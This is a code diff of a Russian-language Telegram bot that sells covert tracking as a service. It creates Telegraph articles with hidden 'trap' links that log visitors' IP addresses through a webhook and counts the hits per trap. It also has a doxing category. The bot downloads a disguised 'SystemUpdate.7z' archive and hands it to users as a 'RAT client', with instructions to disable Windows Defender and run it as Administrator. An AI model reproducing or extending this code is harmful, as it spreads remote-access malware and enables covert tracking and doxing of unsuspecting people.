@@ -1,4 +1,4 @@
-# language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
+# language: Python, file: main_part1.py
 import os
 import time
 import string
@@ -7,6 +7,7 @@ import sqlite3
 import urllib.parse
 import threading
 import requests
+import io
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
 
@@ -22,6 +23,7 @@ ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").spl
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
+PORT        = int(os.environ.get("PORT", 8080))
 
 CHANNEL_ID    = -1004336153105
 CHANNEL_LINK  = "https://t.me/+c3xyHely39ozNDYy"
@@ -29,9 +31,7 @@ SUPPORT       = "@boyfrer"
 REF_REWARD    = 0.1
 REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
-
-# ССЫЛКА НА 7Z АРХИВ (ТВОЙ ФАЙЛ)
-RAT_URL = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
+RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -72,15 +72,18 @@ def set_setting(key, value):
     with _conn() as c:
         c.execute("INSERT INTO settings (key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))
 
-def is_registered(user_id):
-    with _conn() as c: return c.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone() is not None
+def get_user_info(user_id):
+    with _conn() as c: return c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
 
 def register(user_id, username, ref_id=0):
     with _conn() as c:
-        c.execute("INSERT OR IGNORE INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", (user_id, username, datetime.now().isoformat(), int(ref_id)))
-
-def get_user_info(user_id):
-    with _conn() as c: return c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
+        user = c.execute("SELECT referrer_id, ref_rewarded FROM users WHERE user_id=?", (user_id,)).fetchone()
+        if not user:
+            c.execute("INSERT INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", 
+                      (user_id, username, datetime.now().isoformat(), int(ref_id)))
+        else:
+            if user["referrer_id"] == 0 and int(ref_id) != 0 and user["ref_rewarded"] == 0:
+                c.execute("UPDATE users SET referrer_id=? WHERE user_id=?", (int(ref_id), user_id))
 
 def set_user_phone(user_id, phone):
     with _conn() as c: c.execute("UPDATE users SET phone=? WHERE user_id=?", (phone, user_id))
@@ -146,7 +149,7 @@ def get_user_links_count(user_id):
 def get_user_links(user_id, limit=10):
     with _conn() as c: return c.execute("SELECT * FROM links WHERE created_by=? ORDER BY created_at DESC LIMIT ?", (user_id, limit)).fetchall()
 
-def get_all_links(limit=20):
+def get_all_links(limit=30):
     with _conn() as c: return c.execute("SELECT l.*, u.username FROM links l LEFT JOIN users u ON l.created_by = u.user_id ORDER BY l.created_at DESC LIMIT ?", (limit,)).fetchall()
 
 # ---------- UTIL ----------
@@ -158,7 +161,7 @@ def check_sub(user_id):
 
 def send_log(text):
     try: bot.send_message(LOG_CHAT_ID, text, disable_web_page_preview=True)
-    except: pass
+    except Exception as e: print(f"[!] Log error: {e}")
 
 def slug_gen(n=8):
     a = string.ascii_letters + string.digits
@@ -182,10 +185,12 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     html = build_html(text, trap_url, img_url)
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
-    msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nЛовушка: <code>{trap_url}</code>\n=============================\nСсылка: {url}"
+    
+    # Ссылка на ловушку НЕ отправляется в бота, только Telegraph
+    msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nСсылка: {url}"
     return msg, url, slug
 
-# ---------- WEBHOOK ----------
+# ---------- WEBHOOK (FLASK) ----------
 from flask import Flask, request, jsonify
 web_app = Flask(__name__)
 
@@ -219,9 +224,8 @@ def save_ip():
     return jsonify({"ok": True})
 
 def run_webhook():
-    web_app.run(host="0.0.0.0", port=8080, threaded=True, use_reloader=False)
-
-# ---------- MENUS ----------
+    print(f"[*] Webhook server on port {PORT}")
+    web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)# ---------- MENUS ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
@@ -259,9 +263,7 @@ def cmd_start(message):
             try: ref_id = int(param.split("_")[1])
             except: pass
 
-    if not is_registered(uid):
-        register(uid, username, ref_id)
-        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
+    register(uid, username, ref_id)
     
     user = get_user_info(uid)
     if user and user["banned"]: return bot.send_message(uid, "🚫 <b>Вы забанены.</b>")
@@ -282,8 +284,9 @@ def cb_check_sub(call):
         if user["referrer_id"] != 0 and user["ref_rewarded"] == 0:
             add_ref_balance(user["referrer_id"], REF_REWARD)
             set_ref_rewarded(uid)
-            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$")
+            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$ на реф. баланс.")
             except: pass
+            
         bot.delete_message(call.message.chat.id, call.message.message_id)
         show_main_menu(uid)
     else:
@@ -313,6 +316,7 @@ def cb_cabinet(call):
         f"📊 Статус: {prem}",
         f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
         f"👥 Реф. баланс: <b>{get_ref_balance(uid):.2f}$</b>",
+        f"🔗 Линков: {len(links)} | Хитов: {total_hits}",
         "=============================",
         f"🔗 Твоя реф. ссылка:\n<code>{ref_link}</code>"
     ]
@@ -320,6 +324,8 @@ def cb_cabinet(call):
 
     kb = types.InlineKeyboardMarkup(row_width=1)
     if user["phone"] == "—": kb.add(types.InlineKeyboardButton("📱 Поделиться номером", callback_data="share_phone"))
+    
+    kb.add(types.InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links"))
     
     if is_premium(uid):
         kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
@@ -332,6 +338,19 @@ def cb_cabinet(call):
     
     try: bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
     except: bot.send_message(uid, "\n".join(lines), reply_markup=kb)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == "my_links")
+def cb_my_links(call):
+    links = get_user_links(call.from_user.id)
+    if not links:
+        return bot.answer_callback_query(call.id, "У тебя пока нет созданных ловушек.", show_alert=True)
+        
+    text = "<b>📋 Твои последние ловушки:</b>\n\n"
+    for l in links[:10]: 
+        text += f"🔗 <code>{l['slug']}</code> | Хитов: {l['hits']} | {l['title'][:15]}...\n"
+        
+    bot.send_message(call.from_user.id, text, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Назад", callback_data="cabinet")))
     bot.answer_callback_query(call.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == "share_phone")
@@ -398,16 +417,16 @@ def cb_get_rat_exe(call):
     
     msg = bot.send_message(call.from_user.id, "⏳ Скачиваю архив, подождите...")
     try:
-        r = requests.get(RAT_URL, stream=True)
+        r = requests.get(RAT_URL, stream=True, timeout=30)
         r.raise_for_status()
         
         bot.send_document(
             call.from_user.id, 
-            r.raw, 
+            document=("SystemUpdate.7z", r.content), 
             caption="🦠 <b>Ваш RAT-клиент</b>\n\n"
                     "<b>Инструкция:</b>\n"
                     "1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n"
-                    "2. перед распоковкой файла добавьте разрешение .zip/.7z Отключите антивирус (Windows Defender).\n"
+                    "2. Отключите антивирус (Windows Defender).\n"
                     "3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
         )
         bot.delete_message(call.from_user.id, msg.message_id)
@@ -424,9 +443,9 @@ def cmd_admin(m): admin_menu(m.chat.id)
 def cb_admin_get_rat(call):
     msg = bot.send_message(call.from_user.id, "⏳ Загружаю файл...")
     try:
-        r = requests.get(RAT_URL, stream=True)
+        r = requests.get(RAT_URL, stream=True, timeout=30)
         r.raise_for_status()
-        bot.send_document(call.from_user.id, r.raw, caption="🦠 <b>RAT (Админ)</b>")
+        bot.send_document(call.from_user.id, document=("SystemUpdate.7z", r.content), caption="🦠 <b>RAT (Админ)</b>")
         bot.delete_message(call.from_user.id, msg.message_id)
     except Exception as e:
         bot.edit_message_text(f"❌ Ошибка: {e}", call.from_user.id, msg.message_id)
@@ -483,7 +502,7 @@ def _admin_manage_step(message):
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_links' and c.from_user.id in ADMIN_IDS)
 def cb_admin_links(call):
-    links = get_all_links(20)
+    links = get_all_links(30)
     lines = ["<b>🔗 Ссылки:</b>"]
     for l in links: lines.append(f"<code>{l['slug']}</code> · {l['title'][:20]}")
     bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Назад", callback_data="admin_back")))
@@ -536,6 +555,10 @@ def cb_logger(call):
     user = get_user_info(call.from_user.id)
     if user and user["frozen"]:
         return bot.answer_callback_query(call.id, "🧊 Аккаунт заморожен.", show_alert=True)
+        
+    if not is_premium(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
+        if get_user_links_count(call.from_user.id) >= 5:
+            return bot.answer_callback_query(call.id, "❌ Лимит 5 ловушек. Купи Premium!", show_alert=True)
         
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("📙 Д0xing", callback_data="cat_dox"))
